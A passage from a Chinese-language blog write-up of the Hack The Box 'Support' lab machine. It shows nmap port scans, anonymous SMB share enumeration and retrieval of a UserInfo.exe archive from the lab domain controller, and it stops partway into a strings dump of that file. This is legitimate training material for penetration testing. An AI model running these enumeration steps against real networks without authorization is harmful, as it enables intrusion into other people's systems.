

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：SMB匿名访问、DNSpy反编译.NET 二进制文件、密文解密、ldapsearch枚举域用户信息、滥用基于资源的受限委派">
<meta property="og:type" content="article">
<meta property="og:title" content="Support-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/03/20/Support-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：SMB匿名访问、DNSpy反编译.NET 二进制文件、密文解密、ldapsearch枚举域用户信息、滥用基于资源的受限委派">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Support-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Support-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Support-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Support-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Support-htb-writeup/5.png">
<meta property="article:published_time" content="2024-03-20T15:50:55.000Z">
<meta property="article:modified_time" content="2024-03-27T08:17:27.545Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Support-htb-writeup/1.png">
  
  
  
  <title>Support-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Support-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-20 23:50" pubdate>
          2024年3月20日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          38k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          321 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Support-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：SMB匿名访问、DNSpy反编译.NET 二进制文件、密文解密、ldapsearch枚举域用户信息、滥用基于资源的受限委派</p>
<span id="more"></span>  

<p>参考链接：<code>https://0xdf.gitlab.io/2022/12/17/htb-support.html</code></p>
<p>参考链接：<code>https://vandanpathak.com/htb-writeups/support-htb-writeup-and-rbcd-attack/</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.174</p>
<p>2、扫描下开放端口情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">88</span>,<span class="hljs-number">123</span> --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> -sU -sC -sV <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-20 16:39 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span><br>Host is up (<span class="hljs-number">0.32</span>s latency).<br><br>PORT    STATE SERVICE      VERSION<br><span class="hljs-number">53</span>/udp  open  domain       (generic dns response: NOTIMP)<br>| fingerprint-strings: <br>|   NBTStat: <br>|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br><span class="hljs-number">88</span>/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">39</span>:<span class="hljs-number">46</span>Z)<br><span class="hljs-number">123</span>/udp open  ntp          NTP v3<br>| ntp-info: <br>|_  <br><span class="hljs-number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br>SF-Port53-UDP:V=<span class="hljs-number">7.94</span>SVN%I=<span class="hljs-number">7</span>%D=<span class="hljs-number">3</span>/<span class="hljs-number">20</span>%Time=<span class="hljs-number">65F</span>AA0E1%P=aarch64-unknown-linux-g<br>SF:nu%r(NBTStat,<span class="hljs-number">32</span>,<span class="hljs-string">&quot;\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAA</span><br><span class="hljs-string">SF:AAAAAAAAAAAAAAAA\0\0!\0\x01&quot;</span>);<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: <span class="hljs-number">8</span>s<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">32.69</span> seconds<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> -oG allports<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">464</span>/tcp   open  kpasswd5<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49664</span>/tcp open  unknown<br><span class="hljs-number">49668</span>/tcp open  unknown<br><span class="hljs-number">49676</span>/tcp open  unknown<br><span class="hljs-number">49679</span>/tcp open  unknown<br><span class="hljs-number">49757</span>/tcp open  unknown<br><span class="hljs-number">51350</span>/tcp open  unknown<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49664</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">49676</span>,<span class="hljs-number">49679</span>,<span class="hljs-number">49757</span>,<span class="hljs-number">51350</span>,  <br><br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49664</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">49676</span>,<span class="hljs-number">49679</span>,<span class="hljs-number">49757</span>,<span class="hljs-number">51350</span> --min-rate=<span class="hljs-number">10000</span> -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain?<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp   open  kpasswd5?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  tcpwrapped<br><span class="hljs-number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">3269</span>/tcp  open  tcpwrapped<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br><span class="hljs-number">9389</span>/tcp  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">49664</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49668</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49676</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49679</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49757</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">51350</span>/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span>T08:<span class="hljs-number">41</span>:<span class="hljs-number">54</span><br>|_  start_date: N/A<br>|_clock-skew: <span class="hljs-number">-1</span>s<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br></code></pre></td></tr></table></figure>

<p>3、绑定下本地hosts域名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.174 support.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> support.htb<br></code></pre></td></tr></table></figure>

<p>4、SMB服务匿名访问和枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -L <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> -N           <br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share <br>        support-tools   Disk      support staff tools<br>        SYSVOL          Disk      Logon server share <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span>\\NETLOGON -N<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>NT_STATUS_ACCESS_DENIED listing \*<br>smb: \&gt; <span class="hljs-built_in">exit</span><br>                                                                                                               <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.174</span>\\support-tools -N<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Thu Jul <span class="hljs-number">21</span> <span class="hljs-number">01</span>:<span class="hljs-number">01</span>:<span class="hljs-number">06</span> <span class="hljs-number">2022</span><br>  ..                                  D        <span class="hljs-number">0</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">25</span> <span class="hljs-number">2022</span><br>  <span class="hljs-number">7</span>-ZipPortable_21<span class="hljs-number">.07</span>.paf.exe         A  <span class="hljs-number">2880728</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">19</span>:<span class="hljs-number">19</span> <span class="hljs-number">2022</span><br>  npp<span class="hljs-number">.8</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span>.portable.x64.zip          A  <span class="hljs-number">5439245</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">19</span>:<span class="hljs-number">55</span> <span class="hljs-number">2022</span><br>  putty.exe                           A  <span class="hljs-number">1273576</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">06</span> <span class="hljs-number">2022</span><br>  SysinternalsSuite.zip               A <span class="hljs-number">48102161</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">19</span>:<span class="hljs-number">31</span> <span class="hljs-number">2022</span><br>  UserInfo.exe.zip                    A   <span class="hljs-number">277499</span>  Thu Jul <span class="hljs-number">21</span> <span class="hljs-number">01</span>:<span class="hljs-number">01</span>:<span class="hljs-number">07</span> <span class="hljs-number">2022</span><br>  windirstat1_1_2_setup.exe           A    <span class="hljs-number">79171</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">17</span> <span class="hljs-number">2022</span><br>  WiresharkPortable64_3<span class="hljs-number">.6</span><span class="hljs-number">.5</span>.paf.exe      A <span class="hljs-number">44398000</span>  Sat May <span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">19</span>:<span class="hljs-number">43</span> <span class="hljs-number">2022</span><br><br>                <span class="hljs-number">4026367</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">970934</span> blocks available<br>smb: \&gt; get UserInfo.exe.zip<br>getattrib: NT_STATUS_IO_TIMEOUT<br>smb: \&gt; get getSMBecho <span class="hljs-title function_">failed</span> <span class="hljs-params">(NT_STATUS_INVALID_NETWORK_RESPONSE)</span>. The connection is disconnected now<br>NT_STATUS_CONNECTION_DISCONNECTED opening remote file \ge<br><br><br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~/Desktop]<br>└─$ smbclient \\\\10.10.11.174\\support-tools -N<br>Try &quot;help&quot; to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; get UserInfo.exe.zip<br>getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.<span class="hljs-title function_">zip</span> <span class="hljs-params">(<span class="hljs-number">40.6</span> KiloBytes/sec)</span> <span class="hljs-params">(average <span class="hljs-number">40.6</span> KiloBytes/sec)</span><br>smb: \&gt; <span class="hljs-built_in">exit</span><br><br><br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~/Desktop]<br>└─$ smbclient \\\\10.10.11.174\\SYSVOL -N<br>Try &quot;help&quot; to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>NT_STATUS_ACCESS_DENIED listing \*<br>smb: \&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>

<p>5、解压发现的压缩包内容</p>
<p><img src="http://sh1yan.top/photo/Support-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/userinfo]<br>└─$ cat UserInfo.exe.config <br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;configuration&gt;<br>    &lt;startup&gt; <br>        &lt;supportedRuntime version=<span class="hljs-string">&quot;v4.0&quot;</span> sku=<span class="hljs-string">&quot;.NETFramework,Version=v4.8&quot;</span> /&gt;<br>    &lt;/startup&gt;<br>  &lt;runtime&gt;<br>    &lt;assemblyBinding xmlns=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span>&gt;<br>      &lt;dependentAssembly&gt;<br>        &lt;assemblyIdentity name=<span class="hljs-string">&quot;System.Runtime.CompilerServices.Unsafe&quot;</span> publicKeyToken=<span class="hljs-string">&quot;b03f5f7f11d50a3a&quot;</span> culture=<span class="hljs-string">&quot;neutral&quot;</span> /&gt;<br>        &lt;bindingRedirect oldVersion=<span class="hljs-string">&quot;0.0.0.0-6.0.0.0&quot;</span> newVersion=<span class="hljs-string">&quot;6.0.0.0&quot;</span> /&gt;<br>      &lt;/dependentAssembly&gt;<br>    &lt;/assemblyBinding&gt;<br>  &lt;/runtime&gt;<br>&lt;/configuration&gt;  <br></code></pre></td></tr></table></figure>

<p>6、使用strings查看下UserInfo.exe文件信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 